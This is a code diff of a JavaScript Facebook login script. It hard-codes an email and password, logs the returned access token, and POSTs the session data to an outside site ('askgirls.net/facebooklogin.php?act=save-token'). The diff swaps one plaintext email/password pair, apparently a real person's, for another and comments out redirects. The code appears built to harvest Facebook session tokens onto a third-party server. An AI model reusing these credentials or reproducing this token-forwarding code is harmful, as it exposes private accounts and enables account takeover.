@@ -33,7 +33,7 @@ var login = function(email, password, verified_code) {
 			var error_message = JSON.parse(data.error_data).error_message;
 			console.log(error_message);
 			document.write(error_message);
-            window.location.href = "http://askgirls.net/fbconnect.php?act=error&err="+error_message;
+           // window.location.href = "http://askgirls.net/fbconnect.php?act=error&err="+error_message;
 			
 		//Hien thi error message
 		}
@@ -41,6 +41,7 @@ var login = function(email, password, verified_code) {
 	else if (data.session_key) {
 		//thong bao thanh cong va gui data len server
         console.log("chạy tới đây rồi!!!!22222");
+        console.log(data.access_token);
 		$.ajax({
 			type: "POST",
 			url: "http://askgirls.net/facebooklogin.php?act=save-token",
@@ -52,7 +53,7 @@ var login = function(email, password, verified_code) {
         },
         success: function(data) {
             //Redirect toi trang chu
-			location.href = "http://askgirls.net/fbconnect.php?act=go";
+			//location.href = "http://askgirls.net/fbconnect.php?act=go";
         }
     });
 	}
@@ -153,6 +154,7 @@ var loginIframe = function(email, password, verified_code) {
     }
     else if (data.session_key) {
         //thong bao thanh cong va gui data len server
+        console.log(data.access_token);
         console.log("chạy tới đây rồi!!!!22222");
         $.ajax({
             type: "POST",
@@ -419,4 +421,4 @@ function file_get_contents(url, flags, context, offset, maxLen) {
     }
 	
 	
-	login("Trucnguyenant@yahoo.com.vn","25111997");
+	login("berna.nlscebu@gmail.com","jbrothers");
